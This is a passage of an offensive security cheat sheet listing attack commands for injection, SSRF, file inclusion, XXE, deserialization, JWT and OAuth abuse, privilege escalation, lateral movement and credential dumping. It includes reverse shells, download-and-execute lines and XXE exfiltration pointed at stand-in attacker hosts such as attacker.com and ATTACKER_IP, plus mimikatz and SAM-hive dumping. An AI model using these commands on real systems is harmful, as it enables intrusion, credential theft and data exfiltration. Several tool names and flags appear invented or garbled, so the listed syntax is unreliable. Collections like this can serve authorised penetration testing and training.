    jsql -u https://target.com/data.jsp?search=admin%25' --blind
    sqli-detector -u https://target.com/login --data "username=test&password='or 1=1--'"
    sqli-detector -u https://target.com/profile.php?user=1' --check-errors
    ------
    sqlmap -u "https://target.com?id=1" --batch --level 5 --risk 3 --dbs --threads 15 --tamper="apostrophemask,apostrophenullencode,charencode,randomcase,unionallcols,unmagicquotes"
    sqlmap -u "https://target.com/news.php?id=1" --dbs --tamper="base64encode,htmlencode,urlencode" --time-sec 10
    nosqlmap -u https://target.com/api?query=admin --mongo-shell --os-shell --tamper="modunion"
    nosqlmap -u https://target.com/users --get --value "'});db.injection.find({$where:'sleep(5000)'});//"
    ghauri --url https://target.com/search.php?q=1 --dbs --threads 7 --tamper="space2comment"
    ghauri --url https://target.com/item?name=test' --identify --skip-waf
    jsql -u https://target.com/vuln.jsp?id=1 --test="PROCEDURE ANALYSE(sleep(5))"
    jsql -u https://target.com/data.jsp?search=admin%25' --blind --string "admin record"
    sqli-detector -u https://target.com/login --data "username=test&password='or sleep(5)--'" --timeout 10
    sqli-detector -u https://target.com/profile.php?user=1' --check-errors --verbose

### 3.4 Server-Side Vulnerabilities


#### 3.4.1 SSRF Testing
    :- Automated SSRF exploitation on 'url' parameter
    ssrfmap -r request_for_ssrf.txt -p url -m http,gopher --lhost your_server_ip 
    
    :- Use Interactsh for OOB detection
    ssrfmap -r req.txt -p file --handler interactsh
    
    :- Attempt to read local files via SSRF
    ssrfmap -r req.txt -p u --module readfiles --lfile /etc/passwd

    
    :- Start Interactsh client for OOB interactions
    interactsh-client
    
    :- Manual SSRF test with Interactsh
    curl -X POST -d "url=http://YOUR_INTERACTSH_ID.oastify.com" https://target.com/proxy 

    
    :- Inject SSRF payloads from file and check status
    qsreplace "http://target.com/proxy?url=FUZZ" -a "ssrf_payloads.txt" | httpx -silent -status-code -mc 200 
    -----
        ssrfmap -r request.txt -p url=https://yourcollab.com
    ssrfmap -r request.txt -p url=https://yourcollab.com -m portscan
    gopherus --exploit mysql
    gopherus --exploit mysql --inject 'curl https://collab.net'
    ground-control -u https://target.com/redirect?url=COLLAB
    qsreplace -a urls.txt -p ssrf_payloads.txt -o ssrf_urls.txt
    ------
    ssrfmap -r request.txt -p url=https://$(whoami).oastify.com -m portscan -ports 80,443,21,22
    ssrfmap -r post_request.txt -p callback=http://your-server.com/receive -X POST
    gopherus --exploit mysql --inject 'SELECT LOAD_FILE("\\\\\\\\evil\\\\\\\\share\\\\\\\\file.txt")' | curl -v --data-urlencode "url=gopher://127.0.0.1:3306/_$(cat -)" https://target.com/proxy
    gopherus --exploit redis --command "SLAVEOF your-server.com 6379" | curl -v --data-urlencode "url=gopher://127.0.0.1:6379/_$(cat -)" https://target.com/api
    ground-control -u https://target.com/redirect?url=file:///etc/passwd -w /usr/share/wordlists/fuzzdb/wordlists-common/file-extensions-common.txt
    ground-control -u https://target.com/proxy?u=http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
    qsreplace -a urls.txt -p "http://localhost,http://127.0.0.1,file:///,gopher://" -o ssrf_potential.txt
    ------
    ssrfmap -r request.txt -p url=dict://localhost:11211/info -m portscan -ports 1-1000
    ssrfmap -r post_request.txt -p callback=http://[::1]:80/receive -X POST
    gopherus --exploit mysql --inject 'SELECT @@version' | curl -v --data-urlencode "url=gopher://127.0.0.1:3306/_$(cat -)" https://target.com/proxy
    gopherus --exploit redis --command "PING" | curl -v --data-urlencode "url=gopher://127.0.0.1:6379/_$(cat -)" https://target.com/api
    ground-control -u https://target.com/redirect?url=http://169.254.169.254/latest/meta-data/ -w /usr/share/wordlists/fuzzdb/wordlists-common/file-extensions-common.txt -H "X-Forwarded-For: 127.0.0.1"
    ground-control -u https://target.com/proxy?u=http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/
    qsreplace -a urls.txt -p "http://0,http://0.0.0.0,http://[::],file:///,gopher://,ftp://" -o ssrf_bypasses.txt



#### 3.4.2 File Inclusion (LFI/RFI)
    :- Test LFI and RFI, attempt reverse shell
    lfimap -u 'https://target.com/page?file=FUZZ' --rfi --lhost YOUR_IP --lport 4444 
    
    :- Heuristic-based LFI detection
    lfimap -u 'https://target.com/download?path=FUZZ' --heuristics --level 2
    
    :- Use custom LFI wordlist
    lfimap -u 'https://target.com/include.php?page=FUZZ' -w /usr/share/wordlists/wfuzz/general/lfi.txt 

    
    :- Directory traversal tool
    dotdotpwn -m http -h target.com -u "/scripts/download.php?file=TRAVERSAL" -k "root:" -o dotdotpwn_results.txt 
    
    :- Standard traversal, look for /etc/passwd
    dotdotpwn -m http -h target.com -f /etc/passwd -s
    ------
        lfisuite -u https://target.com/view?file=index.html -o lfi_results.txt
    fimap -u 'https://target.com/page?file=XXE' -x
    dotdotpwn -m http -h target.com -u /vuln/page?f=TRAVERSAL -k root
    ------
    lfisuite -u https://target.com/view?file=../../../../etc/passwd -o lfi_results_passwd.txt -b "root:"
    lfisuite -u https://target.com/index.php?page=http://evil.com/malicious.txt -o rfi_evil.txt -r "evil content"
    fimap -u 'https://target.com/page?file=XXE' -x -o fimap_xxe.txt --rhost evil.com --rport 8080
    fimap -u 'https://target.com/image?name=../../../../etc/shadow' --lfi-only -o fimap_lfi_shadow.txt
    dotdotpwn -m http -h target.com -u /vuln/page?f=TRAVERSAL -k root -d 5 -t 10
    dotdotpwn -m ftp -h target.com -u /../../../../etc/passwd -P 21 -k root
    ------
    lfisuite -u https://target.com/view?file=....//....//....//etc/passwd -o lfi_results_dots.txt -b "root:"
    lfisuite -u https://target.com/index.php?page=http://evil.com/malicious.txt%00 -o rfi_nullbyte.txt -r "evil content"
    fimap -u 'https://target.com/page?file=XXE' -x -o fimap_xxe_full.txt --rhost evil.com --rport 8080 --data '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>'
    fimap -u 'https://target.com/image?name=..%2f..%2f..%2f..%2fetc%2fshadow' --lfi-only -o fimap_lfi_encoded.txt
    dotdotpwn -m http -h target.com -u /vuln/page?f=TRAVERSAL -k root -d 7 -t 15 -s /usr/share/seclists/Fuzzing/LFI/LFI-paths.txt
    dotdotpwn -m ftp -h target.com -u /../../../../../../../../etc/passwd -P 21 -k root -o ftp_lfi.txt


#### 3.4.3 Command Injection
    :- Test command injection, run whoami
    commix -u "https://target.com/cmd.php?command=FUZZ" --os-cmd "whoami"
    
    :- POST based, get OS shell
    commix --url="https://target.com/exec?host=127.0.0.1" --data="host=127.0.0.1&submit=submit" -p host --os-shell 
    
    :- Test all injectable parameters from a request file
    commix -r request.txt -p param_to_inject --all


#### 3.4.4 XXE (XML External Entity) Injection
    :- (Manual testing with custom XML payloads is key. Tools can help automate detection)

    :- Example XXE Payload (to be used in a request body or file upload):
    
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <data>&xxe;</data>
    #
    For OOB XXE:
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER_IP:PORT/ext.dtd"> %xxe;]>
    Contents of ext.dtd on attacker server:
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP:PORT/?f=%file;'>">
    %eval;
    %exfil;

    :- (nuclei has XXE templates)    
    :- Run XXE templates
    nuclei -u https://target.com/xml_endpoint -t vulnerabilities/xxe/ 
    ---
        xxeinjector -f request.xml
    docem -u https://target.com/upload


#### 3.4.5 Prototype Pollution
    :- (Primarily a JavaScript vulnerability, manual testing and code review are crucial)
    :- Example in URL: https://target.com/?__proto__[isAdmin]=true
    :- Example in JSON body: {"__proto__": {"isAdmin": true}}
    :- Tools like ppfuzz or custom scripts can help discover potential gadgets.
    
    :- Conceptual: Fuzz for prototype pollution gadgets
    ppfuzz -u https://target.com/script.js -l 3


#### 3.4.6 HTTP Request Smuggling/Desync Attacks
    :- (Tools like Burp's HTTP Request Smuggler extension are essential. CLI tools can help test.)
    
    :- Test for CL.TE and TE.CL vulnerabilities
    smuggler.py -u https://target.com -x
    
    :- Test POST with data, log results
    smuggler.py -u https://target.com -m POST -d "param=val" -l log.txt 
    Turbo Intruder (Burp Extension) is highly effective for this.


#### 3.4.7 Deserialization Vulnerabilities
    :- (Highly language/framework specific. ysoserial for Java, phpggc for PHP)
    
    :- Generate Java deserialization payload
    java -jar ysoserial.jar CommonsCollections5 "curl http://attacker.com/hit" > java_payload.ser 
    
    :- Generate PHP deserialization payload
    phpggc Guzzle/FW1 RCE system "curl http://attacker.com/php_hit" > php_payload.phar 
    (These payloads would then be sent in appropriate request parameters/bodies)


#### 3.4.8 Server-Side Template Injection (SSTI)
    :- (Manual testing with language-specific payloads is common)
    Example Payloads:
    {{ 7*7 }} (Jinja2/Twig)
    <%= 7*7 %> (Ruby ERB)
    ${7*7} (Java EL, Freemarker)
    #{7*7} (Java JSF)
    @(7*7) (Razor .NET)
    
    :- Automated SSTI detection and exploitation
    tplmap -u "https://target.com/page?name=FUZZ" --os-shell
    
    :- Test POST parameter
    tplmap -u "https://target.com/search" -d "query=FUZZ" --os-cmd "whoami" 


#### 3.4.9 CRLF Injection
    crlfuzz -u "https://target.com" -p 10

#### 3.4.10 CORS Misconfigurations
    corsy -u https://target.com

## 4. API TESTING


### 4.1 REST API Testing
    :- API endpoint brute force, 10 extensions deep
    kiterunner -w api_routes.txt -u https://target.com/api -A discovery -x 10 -o kiterunner_scan.txt 
    
    :- Scan using Kiterunner's format
    kiterunner scan -U https://api.target.com -w routes-large.kite --max-api-depth 5 -o kite_depth5.txt 
    
    :- Recon mode on a list of hosts
    kiterunner recon -A assetnote_wordlist/kiterunner/routes-large.kite -s hosts.txt -o kite_recon.txt 

    :- (arjun used previously for general param discovery, also applicable here)    
    :- API GET parameter discovery
    arjun -u https://api.target.com/v1/users --include='application/json' -m GET -o arjun_api_get.json 
    
    :- API POST w/ Auth
    arjun -u https://api.target.com/v1/items -m POST -H "Authorization: Bearer XYZ" -o arjun_api_post_auth.json 
    ------
    kiterunner -w api_wordlist.txt -u https://target.com/api
    kiterunner -w api_wordlist.txt -u https://target.com/api -A discovery
    arjun -u https://target.com/api --include='application/json'
    postman-smuggler -r request.txt
    postman-smuggler -r request.txt -o smuggled_requests
    crAPI -u https://target.com/api -t 20 -o crapi_report.html
    restler fuzz --grammar_file api_spec.json --dictionary words.txt
    ------
    kiterunner -w api_endpoints.txt -u https://target.com/api -A discovery,security -o kiterunner_full.txt -threads 30
    kiterunner -w swagger.json -u https://target.com/api -A all -o kiterunner_swagger.txt
    arjun -u https://target.com/api --include='application/json','application/xml' -o arjun_api_all.json -m all -t 20
    arjun -u https://target.com/api/users/{id} --method PUT --params '{"username":"test","email":"test@example.com"}' -o arjun_put.txt
    postman-smuggler -r request.txt -o smuggled_requests_all -v
    postman-smuggler -r malicious_request.txt -o smuggled_malicious
    crAPI -u https://target.com/api -t 30 -o crapi_report_full.html -deep
    crAPI -u https://target.com/api -auth-type basic -username user -password pass -o crapi_auth.html
    restler fuzz --grammar_file api_spec.json --dictionary words.txt --host target.com --port 443 --ssl
    restler fuzz --grammar_file openapi.yaml --api_key $API_KEY
    swagger-cli validate swagger.json
    swagger-cli bundle swagger.json -o bundled_swagger.json
    ------
    kiterunner -w api_endpoints_extensive.txt -u https://target.com/api -A discovery,security,fuzz -o kiterunner_extensive.txt -threads 40 -v
    kiterunner -w openapi.json -u https://target.com/api -A all -o kiterunner_openapi_full.txt -report-format json
    arjun -u https://target.com/api --include='application/json','application/xml','text/plain' -o arjun_api_all_types.json -m all -t 35 -H "X-Custom-Header: value"
    arjun -u https://target.com/api/users/{id} --method PATCH --params '{"is_admin":true}' -o arjun_patch_admin.txt -b "401,403"
    postman-smuggler -r complex_request.txt -o smuggled_complex -vv
    postman-smuggler -r auth_bypass_request.txt -o smuggled_auth_bypass
    crAPI -u https://target.com/api -t 40 -o crapi_report_very_full.html -deep -rate-limit 200
    crAPI -u https://target.com/api -auth-type bearer -token $BEARER_TOKEN -o crapi_bearer.html
    restler fuzz --grammar_file api_spec.json --dictionary words.txt --host target.com --port 443 --ssl --request_timeout 60
    restler fuzz --grammar_file graphql.json --api_key $GRAPHQL_KEY --method POST --data '{"query": "{ __schema { queryType { name } } }"}'
    swagger-cli bundle swagger.yaml -o bundled_swagger.json --type yaml
    swagger-cli validate bundled_swagger.json --schemaType yaml

### 4.2 GraphQL Testing
    :- Dump schema with auth
    graphqlmap -u https://target.com/graphql --dump-schema --headers "Auth: Bearer TKN" 
    
    :- Custom introspection query
    graphqlmap -u https://target.com/graphql --method query --query '{__schema{types{name}}}' 
    
    :- Schema reconstruction if introspection is disabled
    clairvoyance -o schema_reconstructed.json https://target.com/graphql
    
    :- Use wordlist and header
    clairvoyance -w wordlist_for_graphql.txt -H "X-API-KEY: mykey" https://target.com/graphql 

    
    :- Burp extension, can be used command-line for schema analysis (conceptual)
    inql -t https://target.com/graphql -f schema.json
    
    :- Fingerprint GraphQL engine and dump schema
    graphw00f -t https://target.com/graphql -f -d -o graphw00f_fingerprint.txt 
    
    :- Scan a list of endpoints
    graphw00f -list list_of_graphql_endpoints.txt -o graphw00f_list_scan.txt

    :- (nuclei has GraphQL templates)    
    nuclei -u https://target.com/graphql -t exposures/graphql/graphql-introspection.yaml -o nuclei_graphql_introspection.txt
    -------
    graphqlmap -u https://target.com/graphql --dump-schema
    clairvoyance -o schema.json https://target.com/graphql
    inql -t https://target.com/graphql -o inql_results
    graphw00f -d -f -t https://target.com/graphql
    ------
    graphqlmap -u https://target.com/graphql --dump-schema -o schema.gql
    graphqlmap -u https://target.com/graphql --batching -o batching_vuln.txt
    clairvoyance -o schema_full.json https://target.com/graphql -v
    clairvoyance -o introspection_disabled.json https://target.com/graphql -b
    inql -t https://target.com/graphql -o inql_results_full -headers "Authorization: Bearer token"
    inql -t https://target.com/graphql -o inql_mutation_test --mutation 'mutation { createUser(name: "test", email: "test@example.com") { id } }'
    graphw00f -d -f -t https://target.com/graphql -e
    graphw00f -d -b -t https://target.com/graphql
    ------
    graphqlmap -u https://target.com/graphql --dump-schema -o schema_very_full.gql --depth 5
    graphqlmap -u https://target.com/graphql --batching -o batching_vuln_detailed.txt --batch-size 10
    clairvoyance -o schema_hidden.json https://target.com/graphql -v --hidden
    clairvoyance -o custom_headers.json https://target.com/graphql -h "Authorization: Bearer admin_token"
    inql -t https://target.com/graphql -o inql_results_extensive -headers "X-CSRF-Token: value" -cookies "sessionid=..."
    inql -t https://target.com/graphql -o inql_mutation_complex --mutation 'mutation { updateUser(id: 1, data: { isAdmin: true }) { success } }'
    graphw00f -d -f -t https://target.com/graphql -e -v
    graphw00f -d -b -t https://target.com/graphql --timeout 15


### 4.3 SOAP/WSDL Testing
    wsdlfuzz -u https://target.com/wsdl -o wsdl_results.xml
    soapui -s https://target.com/service?wsdl -t test_case
    ------
    wsdlfuzz -u https://target.com/service?wsdl -o wsdl_results_full.xml -d 3
    wsdlfuzz -u https://target.com/api.asmx?wsdl -o asmx_fuzz.xml -w /usr/share/seclists/Fuzzing/SOAP-WSDL/Common-SOAP-Requests.txt
    soapui -s https://target.com/service?wsdl -t security_test_suite -j
    soapui -s https://target.com/old_service?wsdl -p admin -w password
    ------
    wsdlfuzz -u https://target.com/service?wsdl -o wsdl_results_deep.xml -d 5 -w /usr/share/seclists/Fuzzing/SOAP-WSDL/SOAP-Parameter-Fuzzing.txt
    wsdlfuzz -u https://target.com/api.asmx?wsdl -o asmx_fuzz_extended.xml -w custom_soap_payloads.txt -headers "Content-Type: text/xml"
    soapui -s https://target.com/service?wsdl -t security_test_suite_full -j -Dprop1=value1 -Dprop2=value2
    soapui -s https://target.com/old_service?wsdl -p admin -w password -s "Negative Tests"

## 5. AUTHENTICATION & SESSION TESTING


### 5.1 JWT Testing
    :- Tamper alg, change payload claim
    jwt_tool eyJhbGci... --exploit -X a -pc name -pv admin
    
    :- kid header injection for command execution
    jwt_tool eyJhbGci... --exploit -I -hc kid -hv "/dev/null;whoami"
    
    :- Sign with new key (e.g. after alg confusion)
    jwt_tool eyJhbGci... -S hs256 -k "public_key.pem"
    
    :- Verify with public key
    jwt_tool eyJhbGci... -V -pk public_key.pem
    
    :- Add new 'password' claim
    jwt_tool eyJhbGci... -A -p password
    
    :- Decode only
    jwt_tool eyJhbGci... -d

    
    :- Brute force HS256 secret
    crackjwt -t eyJhbGci... -w rockyou.txt -a HS256
    
    :- Test for weak public key in RS256 (e.g. if it's actually the private key)
    crackjwt -t eyJabc... -w wordlist.txt -a RS256 --pubkey public.pem
    -------
    jwt_tool eyJhbGci...
    jwt_tool eyJhbGci... --exploit -X a -pc name -pv admin
    crackjwt -t eyJhbGci... -w rockyou.txt
    crackjwt -t eyJhbGci... -w wordlist.txt -a HS256
    jwt-hack -t token.jwt -m all -o results.txt
    ------
    jwt_tool eyJhbGci... --exploit -X k -kc "" -pc admin -pv true
    jwt_tool eyJhbGci... --exploit -X n -i
    jwt_tool eyJhbGci... --exploit -X s -hs none
    crackjwt -t eyJhbGci... -w /usr/share/wordlists/rockyou.txt -a HS256,RS256 -v
    crackjwt -t eyJhbGci... -k $(cat private.key) -a RS256 -m verify
    jwt-hack -t token.jwt -m all -o results_full.txt -d /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt
    jwt-hack -t token.jwt -m alg none -s ""
    jwt-hack -t token.jwt -m kid inject -p '{"kid": "../../evil.jwk"}'
    ------
    jwt_tool eyJhbGci... --exploit -X k -kc " " -pc admin -pv " "
    jwt_tool eyJhbGci... --exploit -X n -i -is none
    jwt_tool eyJhbGci... --exploit -X s -hs HS256 -k ""
    crackjwt -t eyJhbGci... -w /usr/share/wordlists/rockyou.txt -a HS256,RS256,ES256 -v -j 8
    crackjwt -t eyJhbGci... -k $(cat public.key) -a RS256 -m verify -p
    jwt-hack -t token.jwt -m all -o results_very_full.txt -d /usr/share/seclists/Passwords/Common-Credentials/probable-v2-top15.txt -delay 1
    jwt-hack -t token.jwt -m cve-2019-11477 -s '{"alg":"none"}'
    jwt-hack -t token.jwt -m jwk -j $(cat evil.jwk)

### 5.2 OAuth Testing
    :- (Manual testing with Burp Suite is common. Tools can assist.)
    :- For conceptual command, imagine a tool:    
    
    :- Test for common misconfigs
    oauth_scanner -u https://auth.target.com/authorize -c client_id_val -r http://localhost/callback --test misconfigs 
    
    :- Test specific flow
    oauth_scanner -u https://auth.target.com/token -g client_credentials --test open_redirect 
    -----
    oauth2test -u https://target.com/oauth -c client_id -r redirect_uri
    burp-oauth -c config.json -p 8080
    ------
    oauth2test -u https://target.com/oauth/authorize -c client_id -r http://evil.com/callback -s invalid_scope
    oauth2test -u https://target.com/oauth/token -g authorization_code -d "client_id=...&client_secret=...&grant_type=authorization_code&code=..." -m POST
    burp-oauth -c config_full.json -p 8080 -v
    burp-oauth -c implicit_grant.json -p 8081
    ------
    oauth2test -u https://target.com/oauth/authorize -c client_id -r http://evil.com/callback -s openid profile email address -response_type code id_token
    oauth2test -u https://target.com/oauth/token -g authorization_code -d "client_id=...&client_secret=...&grant_type=authorization_code&code=...&redirect_uri=http://evil.com/callback" -m POST -H "Content-Type: application/x-www-form-urlencoded"
    burp-oauth -c config_extensive.json -p 8080 -v -debug
    burp-oauth -c implicit_grant_full.json -p 8081 -intercept

### 5.3 Session Management Testing
    :- (Often manual or with Burp Sequencer. For a command line concept:)    
    
    :- Analyze session ID entropy
    session_analyzer --url https://target.com/login --cookies "PHPSESSID=abc" --check-entropy 
    
    :- Test for session fixation
    session_fixation_tester -u https://target.com/login --new-session-url https://target.com/afterlogin 

    :- Use Burp API for brute force
    burp-rest-api --config burp_config.json --intruder-payloads user_pass.txt --intruder-attack https://target.com/login 
    ------
    session-fuzz -u https://target.com/login -c cookies.txt -p params.txt
    session-bruteforcer -u https://target.com -t tokens.txt
    ------
    session-fuzz -u https://target.com/login -c cookies.txt -p /usr/share/seclists/Fuzzing/HTTP-Methods-and-More/HTTP-Methods.txt -m PUT,DELETE
    session-fuzz -u https://target.com/change_password -c session_cookie -d "old_password=test&new_password=FUZZ&confirm_password=FUZZ" -w /usr/share/seclists/Passwords/Common-Credentials/top-passwords.txt
    session-bruteforcer -u https://target.com/api/session -H "X-Session-Token: FUZZ" -t valid_tokens.txt -r "valid"
    ------
    session-fuzz -u https://target.com/login -c cookies.txt -p /usr/share/seclists/Fuzzing/HTTP-Methods-and-More/all.txt -m GET,POST,PUT,DELETE,OPTIONS,TRACE
    session-fuzz -u https://target.com/change_password -c session_cookie -d "current_password=FUZZ&new_password=newpass&confirm_password=newpass" -w /usr/share/seclists/Passwords/Common-Credentials/top-passwords.txt -rate 50
    session-bruteforcer -u https://target.com/api/session -H "Authorization: Bearer FUZZ" -t long_token_list.txt -r "valid" -threads 20

## 6. POST-EXPLOITATION


### 6.1 Privilege Escalation


#### 6.1.1 Linux Privilege Escalation
    :- Find SUID binaries:    find / -perm -u=s -type f 2>/dev/null

    :- Check GTFOBins for exploitation (Assume 'find' binary has SUID)    
    https://gtfobins.github.io/gtfobins/find/
    
    :- Exploit SUID find for root shell
    find . -exec /bin/sh -p \; -quit

    :- Check sudo permissions:    sudo -l

    :- Exploit sudo permission (Assume user can run 'less' as root)    
    https://gtfobins.github.io/gtfobins/less/
    sudo less /etc/profile

    :- Execute shell via less '!' command
    
    :- (Inside less, type !/bin/sh)
    
    :- Check Cron Jobs:    
    ls -la /etc/cron*
    
    cat /etc/crontab

    :- Check Capabilities:    
    getcap -r / 2>/dev/null

    :- Exploit capabilities (Assume /usr/bin/python has cap_setuid+ep)    
    https://gtfobins.github.io/gtfobins/python/
    
    :- Use python capability to get root shell
    /usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")' 

    ::- Linux PrivEsc Check Scripts (Re-iteration with common flags)    
    :- Run all checks (noisy)
    linpeas.sh -a
    
    :- Linux Smart Enumeration, level 0 (quick overview)
    lse.sh -i -l 0
    ----
    linpeas.sh
    linpeas.sh -a -t -s -p -c -S -r -e -P -C
    linux-exploit-suggester.sh -k 5.4.0-26-generic
    pspy64
    pspy64 -p -i -U -C -f
    SUID3NUM -q -p -s -g
    ------
    linpeas.sh -a -t -s -p -c -S -r -e -P -C -l -u -n -i -d /tmp -w /tmp/writable
    linux-exploit-suggester.sh -k $(uname -r) -l
    searchsploit Linux kernel $(uname -r)
    find / -perm -u=s -type f 2>/dev/null
    find / -perm -g=s -type f 2>/dev/null
    find / -writable -type d 2>/dev/null
    find / -user $(whoami) -perm -0400 -type f 2>/dev/null
    pspy64 -p -i -U -C "/bin/bash" -f "root"
    SUID3NUM -q -p -s -g -w
    ------
    linpeas.sh -a -t -s -p -c -S -r -e -P -C -l -u -n -i -d /tmp -w /tmp/writable -b -o /tmp/linpeas_full.txt
    linux-exploit-suggester.sh -k $(uname -r) -l -c
    searchsploit Linux kernel $(uname -r) local privesc
    find / -perm -o=w -type f 2>/dev/null
    find / -nouser -o -nogroup -type f 2>/dev/null
    find / -name "*.so" -perm -u=s -type f 2>/dev/null
    pspy64 -p -i -U -C "/usr/bin/sudo" -f "$(whoami)"
    SUID3NUM -q -p -s -g -w -v

#### 6.1.2 Windows Privilege Escalation
    :- Find interesting files/permissions:
    
    :- Check permissions for Authenticated Users
    accesschk.exe -wsu "Authenticated Users" c:\*.* /accepteula
    
    :- Check ACLs for a file
    icacls C:\path\to\file

    :- Check AlwaysInstallElevated registry keys:    
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    (If both are 1, can create MSI for SYSTEM privileges)

    :- Check Unquoted Service Paths:    
    wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

    :- Exploit Unquoted Service Path (Assume service path is C:\Program Files\Some Dir\service.exe)    
    (Place malicious service.exe at C:\Program.exe or C:\Program Files\Some.exe)

    :- Check for stored credentials:    
    cmdkey /list
    
    :- Example leveraging saved creds
    runas /savecred /user:administrator cmd.exe

    ::- Windows PrivEsc Check Tools (Re-iteration)    
    :- WinPEAS faster checks, cmd output
    winPEASany.exe quiet cmd fast
    
    :- PowerSploit's PowerUp module
    PowerUp.ps1 (Import-Module .\PowerUp.ps1; Invoke-AllChecks)
    ---
    winpeas.exe
    winpeas.exe all quiet csv outputfile=winpeas.csv
    windows-exploit-suggester.py --database 2021-04-15-mssb.xls --ostext 'Windows 10'
    Watson.exe --search all --output results.txt
    ------
    winpeas.exe all quiet csv outputfile=winpeas_full.csv -nobanner
    windows-exploit-suggester.py --database 2023-01-01-mssb.xls --ostext 'Windows Server 2019' --arch 64
    Watson.exe --search all --output results_full.txt --modules kernel32.dll,advapi32.dll
    accesschk.exe -quvwc users c:\
    accesschk.exe -quvwc "Authenticated Users" "HKLM\SYSTEM\CurrentControlSet\Services"
    Get-Process -Id 1 | Get-ObjectSecurity | Format-List -Property *
    Get-Service | Where-Object {$_.StartMode -eq "Auto" -and $_.StartName -ne "NT AUTHORITY\SYSTEM"}
    ------
    winpeas.exe all quiet csv outputfile=winpeas_very_full.csv -nobanner -detailed
    windows-exploit-suggester.py --database 2024-01-01-mssb.xls --ostext 'Windows Server 2022' --arch 64 --cve CVE-2020-*
    Watson.exe --search all --output results_extensive.txt --modules *.dll
    accesschk.exe -quvwc everyone c:\windows
    accesschk.exe -quvwce "NT AUTHORITY\SYSTEM" * /accepteula
    Get-WmiObject -Class Win32_Service | Where-Object {$_.StartMode -eq "Auto" -and $_.StartName -like "*LocalSystem*"} | Format-Table Name, StartName, PathName
    Get-ScheduledTask | Where-Object {$_.settings.runlevel -eq "HighestAvailable"} | Format-Table TaskName, Author

### 6.2 Lateral Movement
    crackmapexec smb 192.168.1.0/24 -u user -p pass -M mimikatz
    evil-winrm -i 192.168.1.10 -u admin -p Password123
    ------
    crackmapexec smb 192.168.1.0/24 -u user -p pass -M psexec -o psexec_success.txt
    crackmapexec rdp 192.168.1.0/24 -u user -p pass -o rdp_success.txt
    evil-winrm -i 192.168.1.10 -u admin -p Password123 -e "powershell -c 'Get-Process'"
    ssh -o StrictHostKeyChecking=no user@192.168.1.15 "whoami"
    ------
    crackmapexec smb 192.168.1.0/24 -u user -p pass -M wmiexec -o wmiexec_success.txt -x "whoami"
    crackmapexec ldap 192.168.1.0/24 -u user -p pass -o ldap_success.txt --pass-pol
    evil-winrm -i 192.168.1.10 -u admin -p Password123 -e "powershell -c 'Invoke-Command -ComputerName remotehost -ScriptBlock { Get-Process }'"
    ssh -o StrictHostKeyChecking=no -i id_rsa user@192.168.1.15 "ls -l"


### 6.3 Data Exfiltration
    mimikatz.exe "sekurlsa::logonpasswords" "exit"
    LaZagne.exe all -oA
    ------
    mimikatz.exe "sekurlsa::ekeys" "exit" > ekeys.txt
    LaZagne.exe browsers -oN browser_creds.txt
    reg save HKLM\SAM sam.hive
    reg save HKLM\SYSTEM system.hive
    python -m http.server 8080 # Serve files for exfil
    ------
    mimikatz.exe "sekurlsa::tickets /export" "exit" > tickets.kirbi
    LaZagne.exe all -oJ all_creds.json
    reg save HKLM\SECURITY security.hive
    net share \\\\attacker_ip\\share c$\ /grant:Everyone,FULL
    copy c:\important_data \\\\attacker_ip\\share\important_data


### 6.4 Credential Dumping & Password Recovery
    :- (Mimikatz and LaZagne were in the original prompt's example, here are conceptual CLI uses)
    
    :- Run Mimikatz commands (Windows)
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > creds.txt 
    
    :- Recover stored passwords (Windows/Linux)
    python3 LaZagne.py all -oN lazagane_results
    
    :- Crack MD5 hashes
    hashcat -m 0 -a 0 hashes.txt rockyou.txt --force
    
    :- Crack NTLM hashes
    hashcat -m 1000 -a 0 ntlm_hashes.txt common_passwords.txt
    
    :- Crack SHA256 with John the Ripper
    john --wordlist=rockyou.txt --format=raw-sha256 hashes_sha256.txt 


### 6.5 Tunneling & Pivoting
    :- Start Chisel server for reverse SOCKS proxy
    chisel server -p 8000 --reverse
    
    :- Chisel client connecting for reverse SOCKS
    chisel client your_server_ip:8000 R:socks
    
    :- Dynamic port forwarding (SOCKS proxy) via SSH
    ssh -D 9050 user@target_server -N
    
    :- Local port forwarding
    ssh -L 8080:localhost:80 user@jump_host -N
    
    :- Remote port forwarding
    ssh -R 9090:localhost:3000 user@your_external_server -N


### 6.6 Living Off The Land (LOLBAS/LOLBINS)
    :- (These are highly dependent on the compromised system)
    
    :- Download file (Windows)
    certutil -urlcache -split -f http://attacker.com/payload.exe C:\temp\payload.exe 
    
    :- PowerShell download & exec
    powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/ps_script.ps1')" 
    
    :- Bash reverse shell
    bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
    
    :- Python reverse shellpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.
    dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 

## 7. OSINT (OPEN SOURCE INTELLIGENCE)


### 7.1 Domain & Email OSINT
    :- Gather emails, subdomains, hosts
    theHarvester -d target.com -l 500 -b google,bing,linkedin -o harvester_report.html 
    
    :- Use all available sources
    theHarvester -d target.com -b all -f harvester_results_all.xml
    
    :- Hunt for social media accounts by username
    sherlock username123 --timeout 10 -o sherlock_results.txt
    
    :- Check multiple usernames, output CSV
    sherlock user1 user2 user3 --csv -o sherlock_multiuser.csv

### 7.2 Google Dorking
